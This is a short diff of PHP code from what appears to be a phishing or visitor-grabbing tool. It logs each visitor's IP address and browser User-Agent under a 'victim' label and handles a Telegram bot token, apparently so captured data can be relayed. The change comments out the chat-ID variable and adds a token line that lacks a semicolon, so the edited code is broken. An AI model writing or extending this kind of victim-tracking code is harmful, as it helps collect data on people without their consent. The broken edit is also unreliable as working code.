@@ -38,15 +38,20 @@ $useragent = " User-Agent: ";
 $browser = $_SERVER['HTTP_USER_AGENT'];
 $victim = "IP: ";
 
-$tgbot = getenv('TGBOT');
-$tgchat = getenv('TGCHAT');
+//$tgbot = getenv('TGBOT');
+//$tgchat = getenv('TGCHAT');
+
+$tgbot = getenv('TGBOT', true) ?: getenv('TGBOT')
+
 
 fwrite($raw, $victim);
 fwrite($raw, $ipaddress);
 fwrite($raw, $useragent);
 fwrite($raw, $browser);
 fwrite($raw, $tgbot);
-fwrite($raw, $tgchat);
+//fwrite($raw, $tgchat);
+
+
 
 
 fwrite($template, $victim);
